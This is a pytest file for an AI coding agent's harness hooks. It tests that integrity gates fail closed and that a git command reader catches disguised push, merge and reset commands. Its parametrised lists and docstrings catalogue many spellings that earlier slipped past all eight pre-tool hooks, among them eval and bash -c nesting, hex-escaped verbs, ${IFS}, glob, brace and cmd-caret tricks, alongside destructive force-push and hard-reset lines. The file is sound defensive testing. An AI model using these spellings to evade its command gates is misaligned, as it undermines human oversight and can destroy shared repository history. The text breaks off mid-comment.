#!/usr/bin/env python3
"""Behaviour tests for the V2 hook layer (HARNESS_V2_SPEC.md II.11/2, phase 2).

Companion to test_hooks.py, which covers the V1 hooks. Everything here asserts the property the
V2 spec calls fail-closed: an integrity gate that cannot verify something must REFUSE, never
shrug. Anchors are named per test; II.12 supplies the concrete cases ("Ueberlanger Hook-stdin ->
bounded read ohne Crash", "korruptes State-YAML und simulierter Hook-Crash -> Block mit
Diagnose").

Fail-closed here always means EXIT CODE 2 specifically. Claude Code blocks on 2 and treats every
other code as a non-blocking error, so a test asserting "not 0" would pass on the exact bug that
lets a crashed hook wave the call through.

Step 1 scope: the shared bridge (_kernel.py), the bounded stdin read and audit-log rotation.
"""
import ast
import glob as globmodule
import hashlib
import io
import json
import os
import pathlib
import re
import shutil
import string
import subprocess
import time
import sys

import pytest

import conftest
from conftest import load_kit_module, satisfy_the_architect_step

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TEAM_KITS = os.path.join(ROOT, "team-kits")
HOOKS = os.path.join(TEAM_KITS, "dev-team", "hooks")
KITS = ("dev-team", "office-team", "research-team")

sys.path.insert(0, HOOKS)
import _audit  # noqa: E402
import _compat  # noqa: E402
import _kernel  # noqa: E402


def write(path, text):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(text)


def run_probe(tmp_path, body, payload="{}", env=None):
    """Run a synthetic hook in a real subprocess — exit codes only mean something out-of-process."""
    probe = os.path.join(str(tmp_path), "probe_hook.py")
    write(probe, "import sys\nsys.path.insert(0, %r)\nimport _kernel\nimport _compat\n%s"
          % (HOOKS, body))
    process_env = dict(os.environ, CLAUDE_PROJECT_DIR=str(tmp_path))
    process_env.pop("HARNESS_KERNEL_PATH", None)
    process_env.update(env or {})
    return subprocess.run([sys.executable, probe], input=payload, capture_output=True,
                          text=True, env=process_env, timeout=120)


def run_hook(name, payload, project_dir, kit="dev-team"):
    env = dict(os.environ, CLAUDE_PROJECT_DIR=str(project_dir))
    env.pop("HARNESS_KERNEL_PATH", None)
    return subprocess.run([sys.executable, os.path.join(TEAM_KITS, kit, "hooks", name)],
                          input=json.dumps(payload) if not isinstance(payload, str) else payload,
                          capture_output=True, text=True, env=env, timeout=120)


# -- bounded stdin (spec II.4 "Hooks lesen stdin BEGRENZT") --------------------

def test_payload_within_the_bound_parses_normally():
    stream = io.StringIO(json.dumps({"tool_name": "Write", "tool_input": {"file_path": "a.txt"}}))
    data = _compat.load(stream)
    assert data["tool_name"] == "Write"
    assert data["tool_input"]["file_path"] == "a.txt"


def test_payload_exactly_at_the_bound_still_parses():
    text = json.dumps({"tool_name": "Write", "tool_input": {}})
    data = _compat.load(io.StringIO(text), limit=len(text))
    assert data["tool_name"] == "Write"


def test_overflow_exits_two_by_default():
    """The default must be the safe one: the first cut returned a sentinel for the caller to
    notice, and ten shipped guards that dispatch on tool_name silently exited 0 = ALLOW."""
    text = json.dumps({"tool_name": "Write", "tool_input": {"content": "x" * 5000}})
    with pytest.raises(SystemExit) as exc:
        _compat.load(io.StringIO(text), limit=1000)
    assert exc.value.code == 2


def test_overflow_returns_a_sentinel_only_when_tolerated():
    text = json.dumps({"tool_name": "Write", "tool_input": {"content": "x" * 5000}})
    assert _compat.load(io.StringIO(text), limit=1000, tolerate_overflow=True) == {
        "_stdin_overflow": True, "tool_input": {}}


def test_a_real_integrity_guard_refuses_an_oversized_payload(tmp_path):
    """II.12 "Ueberlanger Hook-stdin -> bounded read ohne Crash", at the REAL 16 MiB bound and
    against a REAL shipped hook. The regression this pins: a padded Write of the enforcement
    layer walked past guard_harness_selfmod because the oversized payload carried no tool_name."""
    write(str(tmp_path / ".claude" / "settings.json"), "{}")
    payload = {"tool_name": "Write",
               "cwd": str(tmp_path),
               "tool_input": {"file_path": str(tmp_path / ".claude" / "settings.json"),
                              "content": "x" * (_compat.STDIN_LIMIT + 1024)}}
    result = run_hook("guard_harness_selfmod.py", payload, tmp_path)
    assert result.returncode == 2
    assert "stdin bound" in result.stderr


def test_a_normal_sized_payload_still_reaches_the_same_guard(tmp_path):
    """Counterpart to the above: the guard must still block on its OWN grounds, so the test
    above cannot pass merely because everything blocks."""
    write(str(tmp_path / ".claude" / "settings.json"), "{}")
    payload = {"tool_name": "Write", "cwd": str(tmp_path),
               "tool_input": {"file_path": str(tmp_path / ".claude" / "settings.json"),
                              "content": "{}"}}
    result = run_hook("guard_harness_selfmod.py", payload, tmp_path)
    assert result.returncode == 2
    assert "ENFORCEMENT LAYER" in result.stderr


def test_comfort_hook_skips_an_oversized_payload_instead_of_blocking(tmp_path):
    """spec II.4: only comfort hooks are fail-open — and they must really be open."""
    payload = {"tool_name": "Write", "cwd": str(tmp_path),
               "tool_input": {"file_path": str(tmp_path / "a.txt"),
                              "content": "x" * (_compat.STDIN_LIMIT + 1024)}}
    assert run_hook("format_on_write.py", payload, tmp_path).returncode == 0


def test_only_comfort_hooks_opt_out_of_the_bound():
    """The durable check: a new hook that tolerates overflow is opting out of fail-closed, and
    that must be a reviewed decision rather than something noticed later in an incident.

    Recorded decision, so the next reviewer sees intent rather than a discrepancy: the phase-0
    disposition calls guard_yaml_valid "Komfort" (and guard_scratchpad_ref / guard_question_context
    "uebernehmen", unclassified). All three nevertheless refuse an oversized payload, because all
    three BLOCK — a hook that can exit 2 on its own grounds is not fail-open in practice, whatever
    the label says.

    EXTENDED 2026-07-25 (phase-2 step 9), judged by that same rule rather than by any label: the
    twelve hooks that still parsed stdin with a raw `json.load` were given bounded reads, and the
    ones that opted out were each checked for a `sys.exit(2)` first — `session_status` and
    `notify_agent_events` contain none, so neither can refuse a tool call, and making a briefing
    hook fail-closed would mean an unreadable payload silently blocking work. `format_on_write`
    was the original member for exactly that reason. (`auto_dashboard` was a third such member
    until the phase-2 lockstep deleted it: the INDEX is written atomically by the kernel's own state
    writes, not by a Stop hook. The dashboard is a separate, explicit render step —
    `scripts/generate_dashboard.py` — and no kernel path produces it.)

    EXTENDED 2026-08-10 (BUG-0016 / DEC-0032): `clear_handover_marker.py` joins the set. It is a
    SessionStart(startup) hook that deletes `.claude/HANDOVER_PENDING`; it maintains a project file
    and contains no `sys.exit(2)`, so making it fail-closed would let an unreadable payload block a
    fresh session — the opposite of what a marker-cleanup hook is for."""
    tolerating, blockers = set(), set()
    for kit in KITS:
        for path in globmodule.glob(os.path.join(TEAM_KITS, kit, "hooks", "*.py")):
            name = os.path.basename(path)
            if name.startswith("_"):
                continue  # the shared helpers DEFINE the opt-out; only its users matter here
            with open(path, encoding="utf-8") as fh:
                body = fh.read()
            if "tolerate_overflow=True" in body:
                tolerating.add(name)
                if "sys.exit(2)" in body:
                    blockers.add(name)
    assert tolerating == {"format_on_write.py", "session_status.py", "notify_agent_events.py",
                          "kit_trust_state.py", "clear_handover_marker.py"}
    # ...and the rule itself, asserted rather than trusted to the list above: nothing that can
    # BLOCK may opt out, whatever it is called.
    assert blockers == set(), "%s can exit 2 and must not tolerate overflow" % sorted(blockers)


@pytest.mark.parametrize("command,subcommands", [
    # the verb is the SUBCOMMAND, whatever the quoting or the line breaks do to its spelling
    ("git push --force origin main", ["push"]),
    ('git "push" --force origin main', ["push"]),
    ("git pu''sh --force origin main", ["push"]),
    ("git pu\\\nsh --force origin main", ["push"]),
    ('"git" push --force origin main', ["push"]),
    ("git.exe push origin main", ["push"]),
    # git's own options, and the ones that eat the following token
    ("git -c user.name=x push origin main", ["push"]),
    ("git -C /repo push origin main", ["push"]),
    ("git --git-dir /tmp/x push origin main", ["push"]),
    # a message is an ARGUMENT: the verb is what git got, not what the text says
    ('git commit -m "merge later"', ["commit"]),
    ('git commit -m "docs: git push blocked by gate defect"', ["commit"]),
    ('echo "git push --force"', []),
    # ...but code is code, wherever it is written
    ("sudo git push origin main", ["push"]),
    ('bash -lc "git push origin main"', ["push"]),
    ('eval "git push origin main"', ["push"]),
    # PowerShell's eval, on a tool this kit gates in its own right (`SHELL_TOOLS`) — the wrapper
    # family is a property ("hands its quoted string to a command parser"), and leaving these out
    # left one of the two enforced shells with an eval nothing looked into
    ('iex "git push --force origin main"', ["push"]),
    ('Invoke-Expression "git push --force origin main"', ["push"]),
    ('echo "git push --force origin main" | sh', ["push"]),
    ("git status $(git push --force origin main)", ["push", "status"]),
    ('echo "$(git push --force origin main)"', ["push"]),
    ("$(git push origin main)", ["push"]),
    # ...including when the verb is the LAST word before the closing parenthesis, which is the only
    # shape in which the parenthesis can glue itself to the verb. Every parametrised substitution
    # above has arguments after the verb, so the bracket lands on `main` — and a mutation that put
    # the bracket back into the word (verb `push)`, no subcommand at all, the fail-OPEN reading of
    # a real push) left every selector in this repo green.
    ('echo "$(git push)"', ["push"]),
    ("$(git push)", ["push"]),
    ("(git push)", ["push"]),
    ("git add -A && git commit -m wip; git push origin main", ["add", "commit", "push"]),
    # ...and a word in FRONT of the command name decides nothing about it
    ('sudo "git" push --force origin main', ["push"]),
    ('env "git" push origin main', ["push"]),
    ('nohup "git" merge feat/x', ["merge"]),
    ('timeout 5 "git" merge feat/x', ["merge"]),
    ('sudo "g"it push origin main', ["push"]),
    # ANSI-C and locale quoting are QUOTING, not expansion
    ("git $'push' --force origin main", ["push"]),
    ('git $"push" --force origin main', ["push"]),
    # git's own options that take their value as a separate token — all of them, not five of them
    ("git --config-env a.b=C push origin main", ["push"]),
    ("git --attr-source HEAD push origin main", ["push"]),
    # ...and one this reader cannot know: it may or may not eat `HEAD`, so BOTH are candidates
    ("git --brand-new HEAD push origin main", ["head", "push"]),
    # a longer word that merely contains `git` is not git
    ("gitk push", []),
    ("git-lfs push origin main", []),
    # a REDIRECTION is not part of the word it touches — see the dedicated test below for why
    ("git push>/dev/null --force origin main", ["push"]),
    ("git>/dev/null push --force origin main", ["push"]),
    # ...and the counter-case: only a word that is ENTIRELY digits is a descriptor, so `push2`
    # really is what git receives here, and it is not a git command
    ("git push2>/dev/null", ["push2"]),
])
def test_git_invocations_reads_the_subcommand(command, subcommands):
    """THE DEFINITION the whole git-gate layer now rests on, checked directly.

    Every gate that used to spell "git … push" as a pattern had the same two holes, because a
    pattern is a list of spellings and a shell has more of them than anyone enumerates. What a
    push IS: `push` is the first token after `git` that is neither one of git's own options nor
    the value of one — and when the option in front of it is one the reader does not know, BOTH
    readings are returned rather than the convenient one. And what a git COMMAND is: a `git` that
    ENDS a shell word, which the `git` in the middle of a quoted sentence does not, and which the
    quoted word `"git"` does however many other words stand in front of it.
    """
    assert sorted(_compat.git_subcommands(command)) == subcommands, command


@pytest.mark.parametrize("command,verb,arguments", [
    # the operator ends the word BEFORE it — whichever word that is
    ("git push>/dev/null --force origin main", "push", ["--force", "origin", "main"]),
    ("git push</dev/null --force origin main", "push", ["--force", "origin", "main"]),
    ("git push>>log --force origin main", "push", ["--force", "origin", "main"]),
    ("git >/dev/null push --force origin main", "push", ["--force", "origin", "main"]),
    ("git>/dev/null push --force origin main", "push", ["--force", "origin", "main"]),
    ("git merge>/dev/null feat/PR-0001-x", "merge", ["feat/PR-0001-x"]),
    ("git reset>/dev/null --hard HEAD~1", "reset", ["--hard", "HEAD~1"]),
    ("git reset --hard>/dev/null HEAD~1", "reset", ["--hard", "HEAD~1"]),
    ('git "push">/dev/null --force origin main', "push", ["--force", "origin", "main"]),
    # ...and it takes its TARGET and its file DESCRIPTOR with it: neither was ever handed to git
    ("git push origin main >/dev/null 2>&1", "push", ["origin", "main"]),
    ("git push origin main 2>/dev/null", "push", ["origin", "main"]),
    ("git push origin main >out 2>&1 </dev/null", "push", ["origin", "main"]),
    # ...and the target is a WORD like any other, so a quoted one belongs to the redirection too —
    # the Windows spelling of "send the output somewhere", which is where this direction bites
    ('git push origin main > "C:\\My Logs\\out.txt"', "push", ["origin", "main"]),
    # ...but only as far as the redirection reaches: the command separator after it still separates
    ("git push>/dev/null origin main && echo ok", "push", ["origin", "main"]),
])
def test_a_redirection_is_shell_syntax_and_not_part_of_a_word(command, verb, arguments):
    """A shell word ends at a METACHARACTER, and `<`/`>` are two of the ten.

    The reader answered for `& | ; ( )` and not for these, so a redirection glued itself to the
    word next to it. Measured as real hook processes in a scaffolded project, in both directions:

      * `git push>/dev/null --force origin main` read as the subcommand `push>/dev/null`, which is
        no git command, so NONE of the eight PreToolUse hooks applied — the unconditional
        force-push ban, the evidence, pipeline, coverage, packaging and push-token gates all off,
        for one character. `git>/dev/null push` was worse still: the `git` word itself no longer
        ended a word, so the line held no git invocation at all. `git reset --hard>/dev/null` kept
        its verb but lost `--hard` from its arguments, which is the same switch one flag further in.
      * the other direction, from the same gap: `git push origin main >/dev/null 2>&1` handed
        `gate_push_token` four positional tokens and it refused the most ordinary spelling of a
        push as "more than one refspec". A gate that refuses the normal case teaches people to
        write commands it cannot read.

    Both are asserted here, on the verb AND on the arguments, because a fix that only ends the word
    would leave the target standing as an argument.
    """
    invocations = [inv for inv in _compat.git_invocations(command, lower=False)
                   if str(inv.subcommand).lower() == verb]
    assert invocations, command
    assert invocations[0].arguments == arguments, command


@pytest.mark.parametrize("command,verb", [
    ("git pu`sh --force origin main", "push"),
    ("git `push --force origin main", "push"),
    ("git mer`ge feat/x", "merge"),
    ("git rese`t --hard HEAD~1", "reset"),
])
def test_the_reader_knows_powershell_escapes_with_a_backtick(command, verb):
    """The escape character is a property of the SHELL, and this kit gates two of them.

    `SHELL_TOOLS` puts the separate `PowerShell` tool through the same eight PreToolUse hooks as
    `Bash`, and PowerShell escapes with a backtick, not a backslash — verified against a real
    `powershell -File`, where `git pu``sh` arrives as the argument `push`. The reader knew the
    backtick for line CONTINUATIONS only (`_CONTINUATION_RX`), so for every other character it
    read one as a substitution marker and left it standing: measured as real hook processes with
    `tool_name: "PowerShell"`, `git pu``sh --force origin main` matched none of the eight, and
    `git push --for``ce` lifted the unconditional force-push ban — one character, shorter than the
    quoted-verb bypass this layer was rebuilt for.

    Asserted on the resolved SUBCOMMAND rather than on `runs`, because the POSIX reading of the
    same text yields an unresolved verb that would answer yes to anything: only the second reading
    can put the real verb in this set.
    """
    assert verb in _compat.git_subcommands(command), command


def test_the_reader_keeps_the_posix_escape_while_it_knows_the_powershell_one():
    """The counter-assertion: two readings, not one swapped for the other. A backslash inside the
    verb is still the POSIX spelling of that verb, and a Windows path is still a path."""
    assert "push" in _compat.git_subcommands("git pu\\sh --force origin main")
    assert "push" in _compat.git_subcommands("git \\push origin main")
    assert "C:\\src\\repo" in _compat.git_argument_text("git -C C:\\src\\repo push", lower=False)


@pytest.mark.parametrize("command", [
    "V=push; git $V --force origin main",
    "git ${V} --force origin main",
    "git $(echo push) --force origin main",
    "git `echo push` --force origin main",
    "git %VERB% --force origin main",
])
def test_a_verb_the_shell_builds_at_run_time_is_unknown_not_harmless(command):
    """"Cannot read it" is not "it is something else" — and it used to be exactly that.

    Every line here measured as a full ALLOW across all eight PreToolUse hooks while
    `git push --force origin main` was refused by three of them, because the reader took `$v`,
    `$(echo` or `` `echo `` for the subcommand and no gate asks about those. `gate_git` already
    widens fail-closed when a REF is built at run time (`EXPANSION_RX`); applicability did not
    know the state existed.

    Both halves are asserted: the gate applies (`runs` says yes to every verb), and it applies
    because of the UNRESOLVED rule rather than because the text accidentally spells the verb —
    the second assertion is what goes red if someone "fixes" this by matching `push` in `$(echo
    push)`, which would be a new list of spellings.
    """
    assert _compat.wants_push_or_merge(command), command
    assert "push" not in _compat.git_subcommands(command), command
    assert all(not invocation.resolved
               for invocation in _compat.git_invocations(command)
               if invocation.subcommand not in ("echo",)), command


def test_an_unreadably_long_command_reads_as_every_git_command():
    """`GIT_READ_LIMIT`: the answer over the bound is "this could be any git command".

    A bound that returned "no git invocation here" would be a switch, not a bound — the whole
    layer off by one long line. This is the same fail-closed shape `load()` uses for an oversized
    payload (spec II.4)."""
    payload = "echo " + "x" * (_compat.GIT_READ_LIMIT + 1)
    invocations = _compat.git_invocations(payload)
    assert [invocation.resolved for invocation in invocations] == [False]
    assert _compat.wants_push_or_merge(payload)
    assert invocations[0].runs("commit")


def test_the_unresolved_verb_is_an_identity_no_command_text_can_spell():
    """`UNRESOLVED_SUBCOMMAND` is an OBJECT, and that is the whole of its guarantee.

    It used to be the string `"<unresolved>"`, defended by a claim about text: "`<` and `>` are
    redirections, so no shell word ever comes out of `_argument_scan` looking like this". Both
    halves were wrong on the day it was written — the reader did not treat `<`/`>` as syntax at all
    (see the redirection tests above), and quoting makes any string a word regardless:
    `git '<unresolved>'` hands git that exact token, and it came back as a RESOLVED subcommand
    equal to the sentinel. A claim of that shape is only ever as true as the reader's completeness,
    which is house rule 3 — a comment must not promise what the code does not implement.

    Both directions are asserted, because "unspellable" is trivially satisfiable by a sentinel
    nothing ever produces: the verb read out of a command is never the sentinel, AND the one
    invocation that really cannot be read still carries it.
    """
    spelled = _compat.git_subcommands("git '<unresolved>' --force origin main")
    assert _compat.UNRESOLVED_SUBCOMMAND not in spelled
    assert not any(invocation.runs("push")
                   for invocation in _compat.git_invocations("git '<unresolved>' --force"))
    unreadable = _compat.git_subcommands("echo " + "x" * (_compat.GIT_READ_LIMIT + 1))
    assert unreadable == {_compat.UNRESOLVED_SUBCOMMAND}
    # ...and it still RENDERS, because a gate names the verb it refused in its message
    assert "%s" % (_compat.UNRESOLVED_SUBCOMMAND,) == "<unresolved>"


@pytest.mark.parametrize("command", [
    # a brace SEQUENCE with equal ends is ONE word, and that word is `push` — measured against a
    # real bash 5.2 (`echo pus{h..h}` -> `push`, and `git pus{h..h} --dry-run` answers
    # "fatal: No configured push destination", i.e. the push ran)
    "git pus{h..h} --force origin main",
    "git mer{g..g}e feat/PR-0001-x",
    "git re{s..s}et --hard HEAD~1",
    # pathname expansion: these run a push the moment a file named `push` sits in the directory,
    # and the directory is not in the command text
    "git pus[h] --force origin main",
    "git ?ush --force origin main",
    "git pus* --force origin main",
    # ANSI-C quoting: bash decodes all three to `push`, and NOTHING in `_compat` decodes anything.
    # The backslash surviving into the finished token is what makes that readable rather than
    # silently wrong — it can only have come out of a single-quoted span.
    "git $'\\x70ush' --force origin main",
    "git $'\\160ush' --force origin main",
    "git $'\\u0070ush' --force origin main",
    "git $'\\155erge' feat/PR-0001-x",
    "git '\\x70ush' --force origin main",
])
def test_a_verb_the_text_does_not_fix_reads_as_every_git_command(command):
    """THE INVERSION, on the verb: "cannot read it" answers YES, not "it is something else".

    Each line here is a real push/merge/reset in a real bash and measured a full ALLOW across all
    EIGHT PreToolUse hooks, because the reader took `pus{h..h}` and `\\x70ush` for ordinary,
    resolved subcommands that no gate happens to ask about. That is fail-OPEN in the layer spec
    II.4 requires to be fail-closed, and it is the same defect the round before found in `$V`:
    three review rounds each produced the next spelling, which is what a spelling list does.

    So the rule is not "these eleven spellings too". It is `_UNDETERMINED_RX`: a token in which
    the command text stops fixing the value is UNRESOLVED, and `GitInvocation.runs` answers yes to
    every question about it. Both halves are asserted — the gate applies, AND it applies for that
    reason rather than because the text accidentally spells the verb out. The second assertion is
    what goes red if someone "closes" this by teaching the reader to expand braces.
    """
    invocations = _compat.git_invocations(command)
    assert invocations, command
    assert all(not invocation.resolved for invocation in invocations), command
    assert all(invocation.runs("push", "merge", "reset") for invocation in invocations), command


@pytest.mark.parametrize("command", [
    "git${IFS}push --force origin main",
    "git$IFS push --force origin main",
    "git${IFS}merge feat/PR-0001-x",
    "git{,} push --force origin main",
    "git`echo ' '`push --force origin main",
])
def test_an_expansion_glued_to_the_word_git_may_still_be_the_program(command):
    """THE INVERSION, one question earlier: on WHICH `git` is a command.

    Word splitting happens AFTER expansion (POSIX XCU 2.6.5), so the closed metacharacter set that
    `_SYNTAX_CHARS` writes down answers "where does this word end" only for text that is already
    the word. `git${IFS}push --force origin main` force-pushes in a real bash 5.2; the character
    after `git` is `$`, which is in no metacharacter set, so the reader saw no word end, found no
    git invocation, and all eight hooks stood down — a REGRESSION against the spelling-based
    reader this definition replaced, which still caught it.

    `_ends_word` reads an undetermined boundary as a possible one. The token then carries the same
    character, so it is unresolved and the refusal says to spell the subcommand out — asserted
    here, because "it blocks" would also be satisfied by a reader that blocked on every line.
    """
    invocations = _compat.git_invocations(command)
    assert invocations, command
    assert _compat.wants_push_or_merge(command), command
    assert all(not invocation.resolved for invocation in invocations), command


@pytest.mark.parametrize("command", [
    # the six Windows lines the boundary question used to refuse, cross-checked in a real bash
    # AND a real PowerShell with a logging `git` shim: not one of them starts a git process
    "cd C:\\src\\git\\repo",
    "cd C:\\git\\repo",
    'cd "C:\\Program Files\\Git\\bin"',
    "robocopy C:\\git\\a C:\\git\\b /E",
    "Copy-Item C:\\a\\git\\x.txt D:\\b",
    '$env:PATH = "C:\\git\\bin;" + $env:PATH',
    'python -c "import os; os.chdir(r\'C:\\git\\x\')"',
    # ...and the same character on the far side of the question: bash removes the backslash
    # TOGETHER with the space, so this asks for a program called `git push` and runs no git
    "git\\ push --force origin main",
])
def test_a_backslash_after_git_is_not_a_word_end(command):
    """The one character where the VALUE question and the WORD question part company.

    A backslash leaves a token's value undetermined — that is the other question, and it stays
    there. It cannot END the word `git`, because every shell either removes it together with the
    character it protects (bash: `git\\ push` is the single word `git push`) or keeps it as an
    ordinary path character (PowerShell, cmd: `C:\\src\\git\\repo`). Asked at the boundary anyway,
    it refused the most ordinary Windows lines in the repo: each line here measured rc 2 from
    gate_git, gate_packaging_decision and gate_pipeline with no git call in it at all.

    Kept as its own test rather than folded into the counter-battery below, because what is being
    asserted is a DEFINITION and not a spelling: the sibling test above is the half that must stay
    green, and it is the reason the answer cannot simply be "never read an unknown as a break".
    """
    assert not _compat.wants_push_or_merge(command), command
    assert not _compat.git_invocations(command), command


@pytest.mark.parametrize("command,question", [
    # cmd's ESCAPE inside the verb — the VALUE question: `p^ush` is `push` to cmd
    ('cmd /c "git p^ush --force origin main"', "value"),
    ('cmd /c "git pu^sh --force origin main"', "value"),
    # ...and cmd's DELAYED expansion, whose value is not in the line either
    ('cmd /v:on /c "set V=push& git !V! --force origin main"', "value"),
    # the same character at the word BOUNDARY — cmd removes the `^` and only the `^`, so the space
    # behind it is still a separator and `git` really is the program
    ('cmd /c "git^ push --force origin main"', "boundary"),
])
def test_cmd_is_a_shell_this_reader_is_pointed_at(command, question):
    """`cmd` is in `_SHELL_NAMES` and `%VAR%` is in the undetermined set, so cmd was in scope by
    construction — its ESCAPE was not, and neither was the option syntax that turns delayed
    expansion on (`cmd /v:on /c`, whose `:` matched neither the option group nor the c-flag).

    Every line here runs a real force-push. Measured through the PowerShell tool with a `git.bat`
    shim that logs to a FILE (Git Bash rewrites the `/c` into a path, so a `cmd /c` line reaches
    cmd from PowerShell; with MSYS_NO_PATHCONV=1 it reaches it from bash too, same result), and
    every one measured a full ALLOW across all eight PreToolUse hooks.

    The two questions are asserted apart, because that is the whole shape of the fix. Three lines
    are caught on the VALUE of the verb. The fourth is caught one question earlier, on the
    BOUNDARY: without `^` there, `git^` ends no word, the line holds no git invocation at all, and
    it is the boundary answer — not the verb — that is being measured.
    """
    invocations = _compat.git_invocations(command)
    assert invocations, command
    assert _compat.wants_push_or_merge(command), command
    if question == "value":
        assert all(not invocation.resolved for invocation in invocations), command
    else:
        # the `git` ended a word that the text does not spell out to the end; what follows the
        # escape is then read as the verb, and it is undetermined for the same reason
        assert "push" not in {str(invocation.subcommand) for invocation in invocations}, command


@pytest.mark.parametrize("command", [
    "bash -c \"eval 'git push --force origin main'\"",
    "bash -c \"bash -c 'git push --force origin main'\"",
    "eval \"eval 'git push --force origin main'\"",
    "bash -c \"sh -c 'git push --force origin main'\"",
    "bash -c \"bash -c \\\"eval 'git push --force origin main'\\\"\"",
    "echo \"eval 'git push --force origin main'\" | sh",
    "bash <<< \"eval 'git push --force origin main'\"",
])
def test_a_payload_that_is_itself_a_wrapper_is_lifted_again(command):
    """`re.sub` does not rescan what it substituted, and the membership test held TWICE.

    Every line here pushes in a real bash 5.2 (measured with a logging `git` shim) and every one
    measured a full ALLOW across all eight PreToolUse hooks, while `bash -c "git push --force
    origin main"` — one nesting level less — was refused by three. The known-holes comment
    justified the omission with "'this quoted text will later be executed' is not decidable from
    the text", which is true of a filter or a file and false here: the second wrapper is written
    out in the same line.

    The verb is asserted RESOLVED, not merely unsure: lifting is what makes this a push the gates
    can read, and a fixpoint loop that merely widened everything into "unknown" would pass a test
    that only asked whether the gate applies.
    """
    assert _compat.wants_push_or_merge(command), command
    assert "push" in _compat.git_subcommands(command), command


@pytest.mark.parametrize("command", [
    # the ordinary Windows spelling: an option whose VALUE is the next word
    'powershell -ExecutionPolicy Bypass -Command "git push --force origin main"',
    'powershell -NoProfile -ExecutionPolicy Bypass -Command "git push --force origin main"',
    'bash -O extglob -c "git push --force origin main"',
    'sh -o pipefail -c "git push --force origin main"',
    # ...and the attached spelling, which is cmd's
    'cmd /v:on /c "git push --force origin main"',
])
def test_an_option_before_the_c_flag_may_carry_a_value(command):
    """An option is not just a `-word`, and both ways it carries a value were bypasses.

    `powershell -ExecutionPolicy Bypass -Command "git push --force origin main"` pushes for real
    (measured through the PowerShell tool with a logging `git.bat`) and reached NONE of the eight
    PreToolUse hooks: `Bypass` starts with no dash, so the option group could not consume it, and
    the c-flag alternative had to match there instead. `cmd /v:on /c` is the same defect with the
    value attached after a colon.

    The verb is asserted RESOLVED, because what is being measured is that the payload was LIFTED —
    a reader that answered "unsure" for every line with an option in it would pass a test that
    only asked whether the gate applies.
    """
    assert _compat.wants_push_or_merge(command), command
    assert "push" in _compat.git_subcommands(command), command


def test_a_wrapper_with_no_c_flag_at_all_is_not_a_wrapper():
    """The counter-battery for the option group: it may not turn every `-flag` line into code.

    Widening what may stand before the c-flag is the kind of change that quietly starts lifting
    quoted arguments out of ordinary commands, and a quoted argument that is lifted becomes CODE
    to every reader below.
    """
    assert not _compat.wants_push_or_merge('bash -x script.sh "git push --force origin main"')
    assert not _compat.wants_push_or_merge('ssh host -p 22 "git push --force origin main"')
    assert not _compat.wants_push_or_merge('docker run -it alpine "git push --force origin main"')
    assert not _compat.wants_push_or_merge('echo -n "git push --force origin main"')
    # ...and the shortest real wrapper still matches, which is what the backtracking is for
    assert _compat.wants_push_or_merge('bash -lc "git push --force origin main"')


@pytest.mark.parametrize("command", [
    "bash -c $'bash -c \\'git \\x70ush --force\\''",
    "bash -c $'sh -c \\'git \\x70ush --force origin main\\''",
    "eval $'bash -c \\'git \\x70ush --force origin main\\''",
    "bash -c $'bash -c \\'git \\x72eset --hard HEAD~1\\''",
    "bash -c $'eval \\'git \\x6derge feat/PR-0001-x\\''",
])
def test_an_escaped_delimiter_does_not_stop_the_fixpoint(command):
    """The two readings blinding EACH OTHER — the shape a fixpoint lift brought into reach.

    Lifting the outer `$'…'` leaves the inner wrapper's quotes standing as `\\'`, and a span
    pattern that only starts at a bare quote finds nothing, so the fixpoint stopped after one
    round. What was left then defeated both readings at once: the POSIX one ate the payload's
    backslashes and resolved the harmless verb `x70ush`, the PowerShell one kept them and thereby
    read `\\'…\\'` as a real quote pair, inside which `git` ends no word. Every line here runs a
    real push/reset/merge in a bash 5.2 and measured ALL EIGHT PreToolUse hooks ALLOW.

    Closed by letting a span's DELIMITERS carry a backslash — not by decoding anything, which is
    why the assertion is the same shape as the single-stage ANSI-C test rather than a stronger
    one: ONE reading (the PowerShell one) answers "this verb is not fixed by the text", the other
    still resolves the harmless `x70ush`, and one such answer is what the gates decide on. Both
    halves are asserted, so a "fix" that made every line unsure would not pass either.
    """
    invocations = _compat.git_invocations(command)
    assert invocations, command
    assert _compat.wants_push_or_merge(command), command
    assert any(not invocation.resolved for invocation in invocations), command
    assert not {"push", "reset", "merge"} & {str(invocation.subcommand)
                                             for invocation in invocations}, command


@pytest.mark.parametrize("command", [
    # the plain reference, and the one that needs no space at all: `!V!` with V=" " IS the
    # separator, so `git!V!push` is two words
    'cmd /v:on /c "set V=push& git !V! --force origin main"',
    'cmd /v:on /c "set ""V= "" & git!V!push --force origin main"',
    # ...and the MODIFIERS, which is where spelling the content `\\w+` put the hole back. Each of
    # these hands git a real `push --force origin main` in cmd.exe and each reached NONE of the
    # eight hooks while the plain `!V!` beside it was refused by three.
    'cmd /v:on /c "set V=pushXX& git !V:~0,4! --force origin main"',      # substring
    'cmd /v:on /c "set V=pash& git !V:a=u! --force origin main"',         # replacement
    'cmd /v:on /c "git !ERRORLEVEL:0=! push --force origin main"',        # dynamic + replacement
    # the percent form takes the same modifiers, and the reader must read it the same way even
    # where cmd would not expand it (`%V:~0,4%` set in the SAME block stays literal — measured);
    # "the text does not fix this token" is the question, not "does this particular block expand"
    'cmd /c "git %VERB:~0,4% --force origin main"',
])
def test_cmds_delayed_expansion_is_matched_by_its_form(command):
    """A variable reference has a FORM — and BOTH halves of the form are definitions.

    The PAIRING is the first half: `%NAME%` and `!NAME!` are closed constructs, a lone `!` is no
    metacharacter in cmd at all, and reading it as one cost six lines of ordinary prose (the
    counter-test below). The CONTENT is the second half, and spelling it `\\w+` was an enumeration
    one level down: cmd's reference is `!NAME[:modifier]!`, a modifier is `:~0,4` or `:a=u`, and
    neither is `\\w`. Written as "not the delimiter and not a separator" it covers the modifiers,
    the dynamic variables and whatever cmd adds next.

    Parametrised per FORM rather than asserted in one line on purpose: this is the shape that
    regressed once already, and a narrowing that only breaks one of them has to name which.
    """
    assert _compat.wants_push_or_merge(command), command


@pytest.mark.parametrize("command", [
    'echo "I love git!"',
    'echo "finally done with git!"',
    "echo git!",
    "echo 'git!'",
    'Write-Output "migrated to git!"',
    'bash -c "echo git!"',
    'echo "git!!"',
    # ...including the two the FORM makes tempting to guess about rather than measure: a second
    # `!` later in the same quoted span does open a possible word break (inside quotes the
    # whitespace is not a separator, so `! and git!` IS a reference by the definition), but the
    # token that reaches the VERB question keeps its spaces, matches no reference form, and
